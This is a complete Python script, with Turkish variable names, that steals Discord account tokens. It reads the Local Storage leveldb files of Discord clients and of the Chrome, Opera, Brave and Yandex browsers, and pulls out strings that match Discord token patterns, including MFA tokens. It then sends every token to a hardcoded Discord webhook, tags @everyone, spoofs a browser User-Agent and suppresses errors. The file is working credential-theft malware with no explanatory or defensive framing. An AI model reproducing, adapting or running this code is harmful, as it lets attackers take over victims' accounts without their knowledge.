import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK_LINK = 'https://discord.com/api/webhooks/837680473756139520/HPakvDGG3WDCd5vArFTVC6Uyl68gsJd1LMoICKKzd2DO84Sh8PuRftNnsMtTo6asjbyL'
ETIKET = True

def token_ara(konum):
    konum += '\\Local Storage\\leveldb'
    tokenler = []
    for dosya_adi in os.listdir(konum):
        if not dosya_adi.endswith('.log') and not dosya_adi.endswith('.ldb'):
            continue
        for satir in [x.strip() for x in open(f'{konum}\\{dosya_adi}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, satir):
                    tokenler.append(token)
    return tokenler

def motor():
    yerel = os.getenv('LOCALAPPDATA')
    ag = os.getenv('APPDATA')
    paths = {
        'Discord': ag + '\\Discord',
        'Discord Canary': ag + '\\discordcanary',
        'Discord PTB': ag + '\\discordptb',
        'Google Chrome': yerel + '\\Google\\Chrome\\User Data\\Default',
        'Opera': ag + '\\Opera Software\\Opera Stable',
        'Brave': yerel + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': yerel + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    mesaj = '@everyone' if ETIKET else ''

    for platform, konum in paths.items():
        if not os.path.exists(konum):
            continue
        mesaj += f'\n**{platform}**\n```\n'
        tokenler = token_ara(konum)
        if len(tokenler) > 0:
            for token in tokenler:
                mesaj += f'{token}\n'
        else:
            mesaj += 'Bu platformda hiç token bulunamadı.\n'
        mesaj += '```'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': mesaj})

    try:
        req = Request(WEBHOOK_LINK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    motor()